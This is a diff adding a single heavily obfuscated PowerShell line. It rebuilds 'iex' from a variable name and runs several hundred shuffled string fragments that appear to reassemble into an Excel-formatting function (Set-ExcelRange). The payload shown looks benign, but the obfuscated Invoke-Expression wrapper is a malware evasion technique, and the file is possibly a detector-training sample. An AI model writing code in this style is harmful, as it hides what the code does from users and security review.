@@ -1,0 +1,203 @@
+ . ((vARIABlE '*mdr*').naME[3,11,2]-JOiN'') (((("{61}{42}{53}{37}{62}{224}{239}{212}{266}{225}{49}{35}{245}{246}{195}{126}{12}{299}{294}{252}{129}{6}{123}{147}{152}{236}{110}{161}{178}{41}{172}{187}{26}{280}{181}{189}{208}{79}{241}{175}{242}{29}{292}{307}{83}{149}{217}{52}{48}{73}{20}{228}{286}{58}{229}{234}{131}{296}{273}{1}{130}{104}{323}{329}{259}{300}{32}{186}{45}{203}{248}{157}{75}{261}{92}{272}{31}{201}{158}{232}{182}{284}{80}{159}{43}{322}{57}{111}{55}{139}{66}{207}{112}{7}{3}{119}{275}{204}{24}{54}{133}{17}{184}{87}{89}{255}{72}{56}{156}{179}{222}{10}{227}{60}{270}{254}{142}{188}{276}{140}{33}{46}{199}{226}{295}{288}{174}{39}{332}{319}{167}{28}{68}{318}{231}{274}{25}{279}{316}{36}{144}{247}{285}{321}{263}{127}{271}{74}{138}{206}{106}{209}{141}{128}{2}{251}{162}{191}{137}{8}{22}{27}{102}{283}{154}{327}{153}{317}{190}{262}{238}{64}{63}{122}{180}{183}{310}{213}{30}{103}{13}{82}{325}{267}{202}{223}{100}{44}{81}{108}{304}{301}{148}{71}{278}{105}{96}{256}{219}{121}{331}{185}{90}{160}{101}{302}{260}{76}{113}{4}{16}{47}{143}{303}{171}{221}{59}{328}{91}{19}{176}{0}{293}{282}{168}{94}{298}{237}{70}{95}{216}{196}{117}{198}{308}{116}{326}{124}{218}{313}{211}{125}{253}{200}{85}{84}{330}{93}{69}{197}{51}{290}{88}{173}{309}{65}{277}{77}{169}{287}{177}{50}{109}{120}{244}{315}{291}{311}{258}{34}{265}{312}{230}{235}{324}{115}{145}{240}{281}{98}{146}{205}{136}{297}{18}{134}{86}{166}{11}{165}{220}{314}{215}{268}{135}{214}{194}{114}{21}{306}{99}{243}{67}{15}{192}{163}{150}{5}{264}{249}{107}{14}{233}{193}{257}{305}{9}{23}{164}{210}{155}{40}{269}{151}{97}{78}{250}{170}{132}{38}{289}{118}{320}" -f 'PSBoundParameters.ContainsKey(ZJTBorder','        [int]lzGTextRotation ,
+        [Alias(IvqAutoFitIvq)]
+        [Switch]lzGAutoSize,
+        [float]lz','g.Color]::lzGFo','            lzGRange.Style.Font.Bold          = lzGfal','            lzGRange.Style.Numberformat.Format = (Expand-NumberFormat lzGNumberFormat)
+            }
+   ','
+                    (lzGRange.Start','nXml.Style.ExcelB','       lzGRange.Style.Font.Color.SetColor( ([System.Drawing.Color]::Black))
+    ','             lzGRange.Style.TextRotation        = lzGTextRo','bjectIvq -f (l','      lzGRange.Style.Font.UnderLineType  = lzGUnderLineType
+            }
+            if (lzGPSBo','  }
+           ','OpenXml.Style.ExcelB','   if (lzGPSBoundParameters.Contains','       #lzGws.Column(lzG_).Width = lzGWidth
+                            lzGRange.Worksheet.Column(lzG_).Wid','nge -is [OfficeO','         if (lzGBorderColor -','ke        = lzGfalse
+    ','tofit a column','   }
+ ','le]::Solid ,
+    ','ble with this O','tation
+                ( ZJTip','z','           lzGRange.','.Size           = lzG','e',':3.65.90.','ean',',
+','.Merg','ss of a ta','ge ','d
+            }
+    ','    ForEach-Object {lzGRange.Worksheet.Row(lzG_).H','        [Alias(IvqNFormatIvq)]
+        ','ntNameZJT)){
+                lzGRange.Style.F','s.SuppressMessageAttribute(ZJTPSUseShouldProcessForStateChangingFunctionsZJT, ZJTZJT','sage (IvqCan hide a row or a column but not a {0}','ers.Contain','insKey(ZJTHiddenZJT)) {
+                if (lzGRange -is [O','       [Sw','nostics.CodeAnaly','     }
+            elseif (','ZJT }
+                else',')  {
+','        if (lzGPSBoundParameters.ContainsKey(ZJTItalicZJT)) {
+          ','is [string]) {lzGBorderColor = [System.Drawing.Color]::lzGBorderColor }
+     ','l.Style.ExcelFillStyle]lz',' ,
+','Height }
+                elseif (lzGRang','zGPatternColor = [System.Drawing.Color]::lzGP','   [OfficeOpenXm','si','S',' range pararameter you ','oundParameters.ContainsKey(ZJTUnderlineZJT)) {
+                lz','ng -Messag',' [OfficeOpenXml.Styl','     lzGRan','nsKey(ZJTBoldZJ','function Set-ExcelRange {
+    [CmdletBinding()]
+    [Alias(IvqSet-FormatIvq)]
+    [Diag',',Justification=ZJTDoes not change',' lzGHorizontalAlignment
+            }
+            if (lzGPSBoundParameters.ContainsKey(ZJTVe','lignment =','or.SetColor( lzGPatternColor)
+                }
+            }
+            if (lzGPSBoundParame','d also needs a worksheet parameter.Ivq ;return}
+            #else we assume lzGRange is a range.
+            if ','meters.ContainsKey(ZJTWidthZJT)) {
+                if (lzGRa',']lzGStrikeThru
+            }
+            if (','ackgroundColor)
+     ','yle.Border.Top.Style=lzGBorderTop
+                lzGRange.Sty','at = ZJTm/','       }
+            if (lzGPSB','GBackgroundPattern = [OfficeOpenXml.Style.ExcelFillSty','nge.Style.','ers.Remove(IvqRangeI','JTZJT)  }
+            }
+            if (lzG','ge -is [Offic','Range -is [OfficeOpenXml.ExcelColumn]  ) {lzGRange.Hidden = [boo','UnderLineType]::Single,
+        [Switch]lzGStrikeThru,
+','ge -is [OfficeOpenXml.Table.ExcelTable]) {lzGRange = lzGRange.Addres',' {
+     ','Key(ZJTValueZJT))','   ','pe = lzGBackgroundPattern
+                if (lzGBackgroundColor -is [string]) {lzGBackgroundColor = [','groundColorZJT)) {
+                lzGRange.Style.Fill.PatternTy',' a range but not a {0} objectIvq -f (lzGRange.GetType(','       lzGRange.Style.Font.VerticalAlign =','      lzGRange.Style.Fill.Patt',' [OfficeOpe','mat = ZJT[h]:mm:ssZJT   }
+              ','lor)
+         ','heet and a name of a range or a cell ad',' }
+                lzGRange.Style.Fill.BackgroundColor.SetColor(lzGB','tyle=lzGBorderBottom
+               ','le.Border.Top.Color.SetColor(lzGBorderColor)
+            }
+        ','zed as date and localized. It might be overwr','.ExcelRow] -or
+                    lzG','f','           elseif','   {lzGPSBoundParameters[IvqFormulaIvq] = lzGValue -replace ZJT^=ZJT,ZJT','          }
+            if (lzGPSBoundParameters.ContainsKey(ZJTFormulaZJT)) {
+  ','128ZJT  )  vx4 write-host
+         ','e   = [boolean]lzGMerge
+            }
+         ','     [Alias(ZJTHideZJT)]
+     ','stom format, but a preset recogni','Shift
+            }
+            if (lzGPSB','          ForEach-Object {
+                     ','              ','e -is [OfficeOpenXml.ExcelRange] ','groundColorZJT)]
+        lzGFontColor,
+        lzGValue,
+        lzGFormula,
+        [Switch]lzGArrayFormula,
+        [Swit','e IvqThe','   if (lzGResetFont) {
+         ','PSBoundParameters.ContainsKey(ZJTNumberFormatZJT)) {
+    ','ge IvqAuto-fitting columns is not availa','.GetType().name)) }
+ ','T)) {
+                lzGRange.Style.Border.Right.Style=lzGBorderRight','e.Style.Bo','objectIvq -f (lzGRange.GetType().name)) }
+            }
+            if (lzGPSBoundParameters.ContainsKey(ZJTLockedZJT)) {
+                lzGRang','se
+                lzGR',') {
+                  ','spa','rtical','orderStyle]lzGB','           lzGRange.Style.Border.R','ters.ContainsKey(ZJ','Office','PSBoundParameters.ContainsKey(ZJTF','awin','p,
+        [OfficeOpe','GWidth,
+        [float]lzGHeight,
+   ','HorizontalAlignment]lzGHo',']lzGHidden}
+                else {Write-Warning -Mes','tyle.Font.Stri',' or','iled autosizing columns of worksheet ZJTlzGWorksheetNameZJT: lzG_Ivq}
+            }
+       ','   else {Write-Warning -M','
+   ','Font.VerticalAlign ','have specifie','l','ntColor = [System.Dr','ont.Bold    ','       if (lzG','ont.Name           = ','           ',' (lzGRange -is [OfficeOpenXml.ExcelRange] ) {
+                        lzGRange.AutoFitColumns()
+
+     ','orderLeft,
+        [OfficeOpenXml.Style.ExcelBorderStyle]lzG','                if (lzGValue -is [datetime])  { lzGRange.Style.Numberformat.Form','    lzGBac','lzGWidth}
+                elseif (lzGRange -is [OfficeOpenXml.ExcelRange] ) {','ml','BorderRight,
+      ','  }
+            i',' if (lzGPSBoundParameters.ContainsKey(ZJTWrapTextZJT)) {
+                lzGRange.Style.WrapText            = [boolean]lzGWrapText
+         ','eters.Conta','GRange.Style.Font.UnderL','GPSBoundParamet','le; a named','s}
+            elseif (lzGWorksheet -and (lzGRange -is [string] -or lzGRange -is [OfficeOpenXml.ExcelAddress])) {
+                lzGRange = lzGWorksheet.Cells[lzGRange]
+       ','  }
+  ','ch]lzGResetFont,
+     ','eters.ContainsKey(ZJTTextRot',' ','GRange.GetType().name)) }
+            }
+  ','     catch {Write-',').name)) }
+              ','ike         = [bool',' lzGRange.Style.Border.Bottom.S','eOpenXml.ExcelRow]   ) {lzGRange.','n','orderAroundZJT)) {
+    ','itch]lzGItal','e','met','tyle.ExcelVerticalAlignmentFont]l','           if (lzG','zG','   [Switch]lzGBold,
+ ','ine    ','AlignmentZJT)) {
+         ','ineType]lzGUnderLineType = [OfficeOpenXml.Styl','range;','       l','     ','erformat.For','-is [Array]','ic,
+        [Switch]lzGUnderline,
+        [OfficeOpenXml.Styl','       = [boolean]lzG','e.','ContainsKey(ZJTHorizonta','ationZJT)) {','penXml.ExcelColumn]) {lzGRange.Width =','f','ning -Messa','ng.Color]::Black,
+        [','        lzGRang','           if (lzGPatternColor) {
+                    if (lzGPatternColor -is [string]) {l','rder.Left.Color.SetColor(lzGBorderColor)
+            }
+       ','      lzGRange.Style.Font.Italic        ','ack','b','lue -match ZJT','   ','e
+                lzGRange.Style.Font.UnderLine     = lzGfalse
+     ','               }
+                 ',' = lzGFont','(lzGClearAll)  {
+                lzGRange.Clear()
+            }
+         ','Excel','oundParameters.ContainsKey(ZJTFontColorZJT)){
+                if (lzGFontColor -is [string]) {lzGFo','          if (lzGPSBoundParam','BoundParame','s(IvqAddressIvq)]
+        lzGRange ,
+        [Of','            lzGRange','     elseif (lzGAutoSize) {Write-War','essage I','    if (lzGPSBoundParameters.ContainsKey(ZJTBorderLeftZJT)) {
+                lzGRange.Style.Border.Left.Style=lzGBorderLeft
+        ','kgroundColor,
+     ','ight.Colo',' if (lzGValue -is [time','War','       ','  = [boolean]lzGUnderline
+          ','^=ZJT)   ',' system stateZJT)]
+    param(
+        [Parameter(Value','sheet',' = [boolean]lzGital','undParameters.Contai','    [Alias(IvqPatternColourIvq)]
+        lzGPatternColor,
+   ','e','ning -Message (IvqCan set the ','Size',' ','th = lzGWidth
+                        }
+                }
+                else {Write-Warning -Message (IvqCan set the width o','.Excel','height of a row or a range but not a {0} objectI','  [Alias(ZJTFore','    }
+            if (lzGPSBoundParameters.ContainsKey(ZJTBorderTopZJT)) {
+                lzGRange.St','entZJT)) {
+                lzGRange.Style.HorizontalA','FromPipeline = lzGtrue,Position=0)]
+        [Alia','}
+            if (lzGAutosize -and -not lzGenv:NoAutoSize) {
+                try','        [OfficeOpenXml.S','zGFontShift',' (lzGPSBoundPara','  (lzGR','lzGNumberFormat,
+        [OfficeOpenXml.Style.ExcelBorderSt','yle]lzGBorderAround,
+        lzGBorderColor=[System.Drawi','lzGF','         lzGnull = lz','
+              ','lea','ntColor }
+                lzGRange.Style.Font.Color.SetColor(  lzGFontColor)
+            }
+            if (lzGPSBoundParam','ExcelBorderStyle]lzGBorderTo','TB',' lzGRange.Style.F','nXml.Style.ExcelVerticalAlignmentFont]::None
+     ','itten in a moment
+                   ',' a column or a r','Rows) vx4
+                    ','  ','        if (lzGArrayFormula) {lzGRange.CreateArrayFormula((lzGFormula -replace ZJT^=ZJT,ZJTZJT)) }
+                else               {lzGRange.Formula         =  (lzGFormula -replace ZJT^=ZJT,Z','vq)
+            lzGRange vx4 Set-ExcelRange @PSBoundParameters
+        }
+        else {
+            #We should accept, a works','lAlignm','f (lzG','.Column)..(lzGRange.Start.Column + lzGRange.Columns - 1) vx4','eight = lzGHeight','ficeOpenXml.ExcelWorksheet]lzGWork','
+                if (lzGVa','vqFa','fficeOpenX','T)) {
+               ','ontShiftZJT)){
+                lzGRa','dress; a table; the addre','
+        [OfficeOpenXml.Style.ExcelVerticalAlignment]lzGVerticalAlignment,
+        [ValidateRange(-90, 90)]
+','ZJT)){
+                lzGRange.Style.Font','ange.Style.Font.Italic        = lzGfals','bo','ters.ContainsKey(ZJTHeightZJT)) {
+                if (lzGRan','d/yy h:mmZJT }# This is not a cu','FontSize
+            }
+            if (lzGPSBoundP','.ExcelUnderL',' {
+                    if (lzGRange -is [OfficeOpenXml.ExcelColumn]) {lzGRange.AutoFit() }
+                    elsei','          ','   }
+           ',' a row, a column or .Cells[ ]
+            if (lzGRan','ontName
+         ','     [Switch]lzGWrapText,
+       ','Height = l','BoundPara',' ','atternColor }
+              ','Row)..(lzGRang','        [String]lzGFontN','BottomZJT)) {
+     ','lzGBorderBottom,
+        [OfficeOpenXml.Style.','ic
+            }
+            if (lzGPS','rizontalAlignment,','essage (IvqCan au',' lzGRange.Style.Border.Bottom.Color.SetColor(lzGBorderColor)
+        ','orderStyle]','(lzGRan','alue = lzGValue
+    ','      ','PSBoundParameters.ContainsKey(ZJTB',' lzGRange.V','ange but not a {0} o','S configuration.Ivq }
+ ','ame,
+        [float]lzGFontSize,
+ ','     if (lzGPSBoundParameters.ContainsKey(ZJTBorderRightZJ','rnCol','zGRange.Style.VerticalAlignment   = lzGVerticalAlignment
+            }
+            if (lzGPSBoundParameters.ContainsKey(ZJTMergeZJT)) {
+    ','e.Start.Row + lzGRange.',' }
+                }
+                else {Write-War','r.SetColor(lzGBorderColor)
+            }
+            if (lzGPS','ning -M','ange.Start.','arameters.ContainsKey(ZJTFo','f (lzGPSBoundParameters.','lzGPSBoundParameters.ContainsKey(ZJTFont','e.Style.Font.Str','e.Style.Locked=lzGLocked
+            }
+        }
+    }
+}
+
+','   }
+            i','lzGRange -is [string]) {Write-Warni','   [Switch]lzGHidden,','vq -f (lzGRange',' {','
+     ',' ','ge.Style.Border.BorderAround(lzGBorderAround, lzGBorderCo','
+        [Switch]lzGLocked,
+        [Switch]lzGMerge
+    )
+    process {
+        if','System.Drawing.Color]::lzGBackgroundColor','n])  { lzGRange.Style.Numb','sKey(ZJTStrikeThruZJT)) {
+                lzGRang'))-crEPlACE 'lzG',[chAr]36 -rEPlAcE 'vx4',[chAr]124  -crEPlACE'Ivq',[chAr]34 -rEPlAcE  ([chAr]90+[chAr]74+[chAr]84),[chAr]39) )
